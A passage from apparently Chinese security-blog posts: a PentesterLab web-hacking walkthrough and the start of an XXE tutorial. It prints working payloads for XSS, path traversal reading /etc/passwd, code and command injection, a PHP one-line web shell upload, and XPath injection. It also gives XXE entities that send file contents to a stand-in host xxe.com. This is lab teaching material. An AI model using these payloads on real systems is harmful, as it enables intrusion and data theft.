<p>构成以下代码,实现弹窗<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	var $a= &quot;hacker&quot;;alert(1);//&quot;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<h3><span id="example-7">Example 7</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	var $a=&apos;&lt;?php echo htmlentities($_GET[&quot;name&quot;]);?&gt;&apos;;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>使用htmlentities进行HTML编码，默认编码双引号</p>
<h4><span id="payload">Payload</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;;alert(1);//</span><br></pre></td></tr></table></figure>
<h3><span id="example-8">Example 8</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if （isset($_POST[&quot;name&quot;]）)&#123;</span><br><span class="line">	echo &quot;HELLO &quot;.htmlentities($_POST[&quot;name&quot;])</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;form action=&quot;&lt;?php echo $_SERVER[&apos;PHP_SELF&apos;]; ?&gt;&quot; method=&quot;POST&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>利用$_SERVER[‘PHP_SELF’]获取当前页面地址</p>
<p>假设该页面地址为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.110/xss/example8.php</span><br></pre></td></tr></table></figure></p>
<p>访问该页面，得到的表单 html 代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=&quot;post&quot; action=&quot;/xss/example8.php&quot;&gt;</span><br></pre></td></tr></table></figure></p>
<h4><span id="payload">Payload</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h3><span id="example-9">Example 9</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	document.write(location.hash.substring(1));</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h4><span id="payload">Payload</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<h2><span id="directory-traversal">Directory traversal</span></h2><h3><span id="example-1">Example 1</span></h3><p>简单目录遍历</p>
<h4><span id="payload">Payload</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.10/dirtrav/example1.php?file=../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
<h3><span id="example-2">Example 2</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if(!(strstr($file,&quot;/var/www/files/&quot;)))</span><br><span class="line">	die();</span><br></pre></td></tr></table></figure>
<p>检测是否包含/var/www/files/字符串</p>
<h4><span id="payload">Payload</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.110/dirtrav/example2.php?file=/var/www/files/../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
<h3><span id="example-3">Example 3</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$path = preg_replace(&apos;/\x00.*/&apos;,&quot;&quot;,$path);</span><br></pre></td></tr></table></figure>
<p>使用%00截断后面字符串，读取passwd文件</p>
<h4><span id="payload">Payload</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/dirtrav/example3.php?file=../../../../../../../etc/passwd%00</span><br></pre></td></tr></table></figure>
<h2><span id="file-include">File Include</span></h2><h3><span id="example-1">Example 1</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">include($_GET[&quot;page&quot;]);</span><br></pre></td></tr></table></figure>
<h4><span id="payload">Payload</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.110/fileincl/example2.php?page=intro.php</span><br></pre></td></tr></table></figure>
<p>读取intro.php文件</p>
<h3><span id="example-2">Example 2</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$file = preg_replace(&apos;/\x00.*/&apos;,&quot;&quot;,$file);</span><br><span class="line">	include($file);</span><br></pre></td></tr></table></figure>
<p>使用%00截断后面字符串</p>
<h4><span id="payload">Payload</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.110/fileincl/example2.php?page=intro.php%00</span><br></pre></td></tr></table></figure>
<h2><span id="code-injection">Code injection</span></h2><h3><span id="example-1">Example 1</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php   </span><br><span class="line">  $str=&quot;echo \&quot;Hello &quot;.$_GET[&apos;name&apos;].&quot;!!!\&quot;;&quot;;  </span><br><span class="line">  </span><br><span class="line">  eval($str);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>使用了反斜杠【\】将echo后面的内容给转义了。这样做与加addslashes()函数进行过滤的意思是一样的<br>可以通过${${ }}这样的方式绕过，从而继续执行代码。</p>
<h4><span id="payload">Payload</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.101/codeexec/example1.php?name=$&#123;$&#123;phpinfo()&#125;&#125;</span><br></pre></td></tr></table></figure>
<h3><span id="example-2">Example 2</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">class User&#123;  </span><br><span class="line">  public $id, $name, $age;  </span><br><span class="line">  function __construct($id, $name, $age)&#123;  </span><br><span class="line">    $this-&gt;name= $name;  </span><br><span class="line">    $this-&gt;age = $age;  </span><br><span class="line">    $this-&gt;id = $id;  </span><br><span class="line">  &#125;     </span><br><span class="line">&#125;  </span><br><span class="line">  require_once(&apos;../header.php&apos;);  </span><br><span class="line">  require_once(&apos;../sqli/db.php&apos;);  </span><br><span class="line">    $sql = &quot;SELECT * FROM users &quot;;  </span><br><span class="line">  </span><br><span class="line">    $order = $_GET[&quot;order&quot;];  </span><br><span class="line">    $result = mysql_query($sql);  </span><br><span class="line">  if ($result) &#123;  </span><br><span class="line">        while ($row = mysql_fetch_assoc($result)) &#123;  </span><br><span class="line">      $users[] = new User($row[&apos;id&apos;],$row[&apos;name&apos;],$row[&apos;age&apos;]);  </span><br><span class="line">    &#125;  </span><br><span class="line">    if (isset($order))&lt;span style=&quot;color:#FF0000;&quot;&gt; &#123;   </span><br><span class="line">      usort($users, create_function(&apos;$a, $b&apos;, &apos;return strcmp($a-&gt;&apos;.$order.&apos;,$b-&gt;&apos;.$order.&apos;);&apos;));  </span><br><span class="line">    &#125;&lt;/span&gt;  </span><br><span class="line">    &#125;     </span><br><span class="line">  </span><br><span class="line">        ?&gt;  </span><br><span class="line">        &lt;table class=&apos;table table-striped&apos; &gt;  </span><br><span class="line">        &lt;tr&gt;  </span><br><span class="line">            &lt;th&gt;&lt;a href=&quot;example2.php?order=id&quot;&gt;id&lt;/th&gt;  </span><br><span class="line">            &lt;th&gt;&lt;a href=&quot;example2.php?order=name&quot;&gt;name&lt;/th&gt;  </span><br><span class="line">            &lt;th&gt;&lt;a href=&quot;example2.php?order=age&quot;&gt;age&lt;/th&gt;  </span><br><span class="line">        &lt;/tr&gt;  </span><br><span class="line">        &lt;?php  </span><br><span class="line">  </span><br><span class="line">    foreach ($users as $user) &#123;    </span><br><span class="line">            echo &quot;&lt;tr&gt;&quot;;  </span><br><span class="line">                echo &quot;&lt;td&gt;&quot;.$user-&gt;id.&quot;&lt;/td&gt;&quot;;  </span><br><span class="line">                echo &quot;&lt;td&gt;&quot;.$user-&gt;name.&quot;&lt;/td&gt;&quot;;  </span><br><span class="line">                echo &quot;&lt;td&gt;&quot;.$user-&gt;age.&quot;&lt;/td&gt;&quot;;  </span><br><span class="line">            echo &quot;&lt;/tr&gt;&quot;;  </span><br><span class="line">        &#125;     </span><br><span class="line">        echo &quot;&lt;/table&gt;&quot;;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>create_function()的不当使用造成代码注入，可以这样构造);}phpinfo();//<br>执行我们的命令，);}是闭合了前面的代码，而//则是将后面的内容注释掉</p>
<h4><span id="payload">Payload</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.101/codeexec/example2.php?order=id);&#125;phpinfo();//</span><br></pre></td></tr></table></figure>
<h3><span id="example-3">Example 3</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">    echo preg_replace($_GET[&quot;pattern&quot;], $_GET[&quot;new&quot;], $_GET[&quot;base&quot;]);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>/e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。<br>因此当满足了在语句的构造中有/e修正符，就有可能引起php代码注入的风险。可以如此构造new=phpinfo()&amp;pattern=/lamer/e&amp;base=Hello lamer</p>
<h4><span id="payload">Payload</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.101/codeexec/example3.php?new=phpinfo()&amp;pattern=/lamer/e&amp;base=Hello lamer</span><br></pre></td></tr></table></figure>
<h3><span id="example-4">Example 4</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">  // ensure name is not empty   </span><br><span class="line">  assert(trim(&quot;&apos;&quot;.$_GET[&apos;name&apos;].&quot;&apos;&quot;));  </span><br><span class="line">  echo &quot;Hello &quot;.htmlentities($_GET[&apos;name&apos;]);  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>如此构造即可：hacker’.phpinfo().’</p>
<h4><span id="payload">Payload</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.101/codeexec/example4.php?name=hacker&apos;.phpinfo().&apos;</span><br></pre></td></tr></table></figure>
<h2><span id="commands-injection">Commands injection</span></h2><h3><span id="example-1">Example 1</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  system(&quot;ping -c 2 &quot;.$_GET[&apos;ip&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4><span id="payload">Payload</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.101/commandexec/example1.php?ip=127.0.0.1|id</span><br></pre></td></tr></table></figure>
<h3><span id="example-2">Example 2</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  if (!(preg_match(&apos;/^\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;.\d&#123;1,3&#125;$/m&apos;, $_GET[&apos;ip&apos;]))) &#123;</span><br><span class="line">     die(&quot;Invalid IP address&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  system(&quot;ping -c 2 &quot;.$_GET[&apos;ip&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>正则表达式中有一个修饰符/m。它只检查一行，不关心下一行,此时我们可以利用%0a（换行符）绕过</p>
<h4><span id="payload">Payload</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.101/commandexec/example2.php?ip=127.0.0.1%0aid</span><br></pre></td></tr></table></figure>
<h3><span id="example-3">Example 3</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  if (!(preg_match(&apos;/^\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;.\d&#123;1,3&#125;$/&apos;, $_GET[&apos;ip&apos;]))) &#123;</span><br><span class="line">     header(&quot;Location: example3.php?ip=127.0.0.1&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  system(&quot;ping -c 2 &quot;.$_GET[&apos;ip&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>利用Location重定向到example3.php?ip=127.0.0.1，这里可以是用curl、burpsuite和nc查看回显</p>
<h4><span id="payload">Payload</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -e &quot;GET /commandexec/example3.php?ip=127.0.0.1;id HTTP/1.1\r\nHost: 192.168.56.101\r\nConnection: close\r\n&quot; | nc 192.168.56.101 80</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.56.101/commandexec/example3.php?ip=127.0.0.1|ls</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/pentesterlab1.png" alt=""></p>
<h2><span id="file-upload">File Upload</span></h2><h3><span id="example-1">Example 1</span></h3><p>直接上传一句话木马1.php。</p>
<h4><span id="payload">Payload</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.php</span><br><span class="line">&lt;?php @eval($_POST[&apos;c&apos;]);?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/updata1.png" alt=""></p>
<h3><span id="example-2">Example 2</span></h3><p>直接上传一句话木马1.php。失败。</p>
<p>把上传文件的文件名修改为1.php.aaaa<br>对于apache这样的服务器，碰到aaaa发现是不认识的文件名后缀，然后就会跳过这个文件名，解析下一个文件名。<br>成功上传</p>
<p>根据php版本也可以尝试.php3,.php4,.php5此类后缀名进行上传。</p>
<h4><span id="payload">Payload</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.php.aaaaa</span><br><span class="line">&lt;?php @eval($_POST[&apos;c&apos;]);?&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.php3</span><br><span class="line">&lt;?php @eval($_POST[&apos;c&apos;]);?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/updata2.png" alt=""></p>
<h2><span id="xml-attacks">XML attacks</span></h2><h3><span id="example-1">Example 1</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$xml=simplexml_load_string($_GET[&apos;xml&apos;]);</span><br><span class="line">	print_r((string)$xml);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>直接读取/etc/passwd</p>
<h4><span id="payload">Payload</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;test&gt;&amp;xxe;&lt;/test&gt;</span><br></pre></td></tr></table></figure>
<p>Url编码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.114/xml/example1.php?xml=%3C%21DOCTYPE%20test%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2f%2f%2fetc%2fpasswd%22%3E%5D%3E%3Ctest%3E%26xxe%3B%3C%2ftest%3E</span><br></pre></td></tr></table></figure>
<h3><span id="example-2">Example 2</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php require_once(&quot;../header.php&quot;);</span><br><span class="line"></span><br><span class="line">  $x = &quot;&lt;data&gt;&lt;users&gt;&lt;user&gt;&lt;name&gt;hacker&lt;/name&gt;&lt;message&gt;Hello hacker&lt;/message&gt;&lt;password&gt;pentesterlab&lt;/password&gt;&lt;/user&gt;&lt;user&gt;&lt;name&gt;admin&lt;/name&gt;&lt;message&gt;Hello admin&lt;/message&gt;&lt;password&gt;s3cr3tP4ssw0rd&lt;/password&gt;&lt;/user&gt;&lt;/users&gt;&lt;/data&gt;&quot;;</span><br><span class="line"></span><br><span class="line">  $xml=simplexml_load_string($x);</span><br><span class="line">  $xpath = &quot;users/user/name[.=&apos;&quot;.$_GET[&apos;name&apos;].&quot;&apos;]/parent::*/message&quot;;</span><br><span class="line">  $res = ($xml-&gt;xpath($xpath));</span><br><span class="line">  while(list( ,$node) = each($res)) &#123;</span><br><span class="line">      echo $node;</span><br><span class="line">  &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4><span id="payload">Payload</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.114/xml/example2.php?name=hacker&apos; 加单引号报错</span><br><span class="line"></span><br><span class="line">http://192.168.1.114/xml/example2.php?name=hacker&apos;or &apos;1&apos;=&apos;1 得到两个name值</span><br><span class="line"></span><br><span class="line">http://192.168.1.114/xml/example2.php?name=hacker&apos;or 1=1]/parent::*/child::node()%00 得到所有值</span><br></pre></td></tr></table></figure>
<h2><span id="reference">Reference</span></h2><p><a href="http://f4l13n5n0w.github.io/blog/2015/05/23/pentesterlab-web-for-pentester-final/" target="_blank" rel="noopener">[PentesterLab] Web for Pentester - FINAL</a><br><a href="http://www.jb51.net/article/38714.htm" target="_blank" rel="noopener">慎用preg_replace危险的/e修饰符(一句话后门常用)</a><br><a href="http://blog.csdn.net/while0/article/details/72276440" target="_blank" rel="noopener">PHP create_function()代码注入 (执行脚本函数）</a><br><a href="http://www.uml.org.cn/test/201507204.asp" target="_blank" rel="noopener">Web渗透测试攻略(上)</a><br><a href="http://www.uml.org.cn/test/201507205.asp" target="_blank" rel="noopener">Web渗透测试攻略(中)</a><br><a href="http://www.uml.org.cn/test/201507206.asp" target="_blank" rel="noopener">Web渗透测试攻略(下)</a></p>
]]></content>
      
        <categories>
            
            <category> 笔记 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[XML实体注入漏洞的利用与学习]]></title>
      <url>https://uknowsec.cn/posts/notes/XML%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="前言">前言</span></h2><p>XXE Injection即XML External Entity Injection,也就是XML外部实体注入攻击.漏洞是在对非安全的外部实体数据进行处理时引发的安全问题.<br>在XML1.0标准里,XML文档结构里定义了实体(entity)这个概念.实体可以通过预定义在文档中调用,实体的标识符可访问本地或远程内容.如果在这个过程中引入了”污染”源,在对XML文档处理后则可能导致信息泄漏等安全问题</p>
<h2><span id="漏洞利用">漏洞利用</span></h2><p>当允许引用外部实体时，通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</p>
<h3><span id="测试代码">测试代码</span></h3><h4><span id="使用simplexml_load_string函数解析body">使用simplexml_load_string函数解析body</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$data = file_get_contents(&apos;php://input&apos;);</span><br><span class="line">$xml = simplexml_load_string($data);</span><br><span class="line">echo $xml-&gt;name;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3><span id="漏洞测试">漏洞测试</span></h3><h4><span id="漏洞测试方式1">漏洞测试方式1</span></h4><p>有回显，直接读取文件</p>
<p>Payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xxe.png" alt=""></p>
<h4><span id="漏洞测试方式2">漏洞测试方式2</span></h4><p>无回显，引用远程服务器上的XML文件读取文件</p>
<p>Payload:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://xxe.com/1.xml&quot;&gt;</span><br><span class="line">%remote;]&gt;</span><br></pre></td></tr></table></figure>
<p>将以下1.xml保存到WEB服务器下<br>1.xml<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % a SYSTEM &quot;file:///etc/passwd&quot;&gt; </span><br><span class="line">&lt;!ENTITY % b &quot;&lt;!ENTITY &amp;#37; c SYSTEM &apos;gopher://xxe.com/%a;&apos;&gt;&quot;&gt; %b; %c</span><br></pre></td></tr></table></figure></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xxe1.png" alt=""></p>
<p>查看服务器access.log，可以看到访问日志<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xxe3.png" alt=""></p>
<h4><span id="漏洞测试方式3">漏洞测试方式3</span></h4><p>在主机上放一个接收文件的php(get.php):<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">file_put_contents(&apos;01.txt&apos;, $_GET[&apos;xxe_local&apos;]);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>1.xml内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % payload	SYSTEM	 &quot;php://filter/read=convert.base64-encode/resource=file:///etc/passwd&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; trick SYSTEM &apos;http://xxe.com/get.php?xxe_local=%payload;&apos;&gt;&quot;&gt;</span><br><span class="line"></span><br><span class="line">%int;</span><br><span class="line"></span><br><span class="line">%trick;</span><br></pre></td></tr></table></figure></p>
<p>这个XML，他引用了外部实体etc/passwd作为payload的值，然后又将payload拼接到<a href="http://xxe.com/get.php?xxe_local=%payload;，进行HTTP请求。" target="_blank" rel="noopener">http://xxe.com/get.php?xxe_local=%payload;，进行HTTP请求。</a></p>
<p>接收到请求的get.php就将这个文件内容保存到01.txt了，形成了一个文件读取的过程。</p>
<p>发包过去后，就会请求1.xml，解析这个xml造成XXE攻击，读取etc/passwd并进行base64编码后传给get.php，最后保存到主机上<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xxe2.png" alt=""></p>
<p>查看服务器access.log，可以看到访问日志<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xxe4.png" alt=""></p>
<p>查看01.txt<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xxe5.png" alt=""></p>
<p>base64解码<br><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xxe6.png" alt=""></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xxe7.png" alt=""><br>上图是默认支持协议，还可以支持其他，如PHP支持的扩展协议有</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/xxe8.png" alt=""></p>
<h2><span id="xxe-危害">XXE 危害</span></h2><ul>
<li>读取任意文件</li>
<li>执行系统命令</li>
<li>探查内网端口</li>
<li>攻击内网网站</li>
</ul>
<h3><span id="读取任意文件">读取任意文件</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;name&gt;&amp;xxe;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure>
